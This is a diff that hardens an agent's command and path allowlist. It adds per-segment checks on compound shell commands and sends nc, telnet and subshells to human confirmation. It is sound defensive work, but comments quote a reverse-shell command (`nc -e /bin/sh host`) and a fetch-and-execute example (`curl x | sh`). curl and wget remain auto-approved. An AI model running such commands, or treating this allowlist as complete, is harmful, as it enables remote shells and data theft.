@@ -365,8 +365,8 @@ FORBIDDEN_PATTERNS = [
 ]
 
 # 文件访问限制（允许的目录或路径前缀）
+# 注意：不要在此加入 '/'，否则任意绝对路径都会命中前缀匹配，路径白名单将完全失效
 ALLOWED_PATHS = [
-    '/',
     '/home',
     '/opt',
     '/var/log',
@@ -380,8 +380,6 @@ ALLOWED_PATHS = [
     '/workspace',
     '/srv',
     '/www',
-    '.',
-    '..',
 ]
 
 MAX_FILE_SIZE = 1024 * 1024  # 最大读取 1MB
@@ -581,6 +579,11 @@ def is_path_allowed(path):
 
     abs_path = os.path.abspath(path)
 
+    # 工作区自身始终允许：agent 需要读回它写下的记忆与探针脚本
+    ws_abs = os.path.abspath(WORKSPACE)
+    if abs_path == ws_abs or abs_path.startswith(ws_abs + os.sep):
+        return True
+
     for allowed in ALLOWED_PATHS:
         if abs_path == allowed or abs_path.startswith(allowed + '/'):
             return True
@@ -621,7 +624,9 @@ SAFE_READONLY_PATTERNS = [
     # 网络诊断
     r'^curl\s+', r'^wget\s+', r'^ping\s+', r'^netstat\s+', r'^ss\s+',
     r'^nslookup\s+', r'^dig\s+', r'^host\s+', r'^traceroute\s+',
-    r'^mtr\s+', r'^tcpdump\s+', r'^nmap\s+', r'^telnet\s+', r'^nc\s+',
+    r'^mtr\s+', r'^tcpdump\s+', r'^nmap\s+',
+    # 注意：nc / telnet 故意不列入免确认名单 —— `nc -e /bin/sh host` 是标准反弹
+    # shell 手法，telnet 亦可用于交互式外连。它们仍可执行，但每次都需人工确认。
     r'^ip\s+', r'^ifconfig\s+', r'^route\s+', r'^arp\s+',
     # 系统信息
     r'^df\s+', r'^du\s+', r'^free\s+', r'^uptime\s+', r'^w\s+',
@@ -659,15 +664,102 @@ SAFE_READONLY_PATTERNS = [
     r'^cat\s+/proc/', r'^md5sum\s+', r'^sha256sum\s+',
 ]
 
+def split_command_segments(cmd):
+    """把复合命令按 shell 控制符拆成独立命令段，用于逐段安全校验。
+
+    execute_command 以 shell=True 执行整条字符串，因此 `ls; curl x | sh` 里的
+    每一段都会真正执行。只对整条命令做前缀匹配会被第一段“骗过”，所以放行前
+    必须先把命令拆开、逐段校验。
+
+    拆分符：&& || ; | & 换行。引号内（'...' / "..."）和反斜杠转义的分隔符不拆，
+    避免误伤 grep 'a;b'、awk -F'|' 这类正常用法；`2>&1` 中的 & 属于重定向，
+    也不作为分隔符。
+    """
+    if not cmd:
+        return []
+
+    segments = []
+    buf = ''
+    quote = None
+    i = 0
+    n = len(cmd)
+    while i < n:
+        ch = cmd[i]
+
+        # 转义符：连同下一个字符原样收入，不参与分隔判断（单引号内无转义语义）
+        if quote != "'" and ch == '\\' and i + 1 < n:
+            buf += ch + cmd[i + 1]
+            i += 2
+            continue
+
+        # 引号进出
+        if quote:
+            buf += ch
+            if ch == quote:
+                quote = None
+            i += 1
+            continue
+        if ch in ('"', "'"):
+            quote = ch
+            buf += ch
+            i += 1
+            continue
+
+        # 双字符分隔符
+        if cmd[i:i + 2] in ('&&', '||'):
+            segments.append(buf)
+            buf = ''
+            i += 2
+            continue
+
+        # `2>&1` / `>&2` 里的 & 是重定向的一部分，不是分隔符
+        if ch == '&' and buf.rstrip().endswith('>'):
+            buf += ch
+            i += 1
+            continue
+
+        # 单字符分隔符
+        if ch in (';', '|', '&', '\n'):
+            segments.append(buf)
+            buf = ''
+            i += 1
+            continue
+
+        buf += ch
+        i += 1
+
+    segments.append(buf)
+    return [s.strip() for s in segments if s.strip()]
+
+# 命令替换 / 子 shell 标记：无法静态拆解，出现即降级为人工确认
+SUBSHELL_MARKERS = ('$(', '`', '${')
+
 def is_safe_readonly_command(cmd):
-    """检查是否是安全的只读命令（不需要确认）"""
+    """检查是否是安全的只读命令（不需要确认）。
+
+    复合命令要求**每一段**都命中只读白名单，任意一段不匹配则整条走人工确认。
+    """
     if not cmd:
         return False
     cmd = cmd.strip()
-    for pattern in SAFE_READONLY_PATTERNS:
-        if re.match(pattern, cmd):
-            return True
-    return False
+
+    # 命令替换会引入无法静态分析的子命令
+    for marker in SUBSHELL_MARKERS:
+        if marker in cmd:
+            return False
+
+    # 输出重定向意味着写盘，不属于只读（放行 2>/dev/null 这类 fd 重定向）
+    if re.search(r'(?<![0-9<>])>{1,2}', cmd):
+        return False
+
+    segments = split_command_segments(cmd)
+    if not segments:
+        return False
+
+    for seg in segments:
+        if not any(re.match(pattern, seg) for pattern in SAFE_READONLY_PATTERNS):
+            return False
+    return True
 
 def safe_read_file(filepath):
     """安全读取文件"""
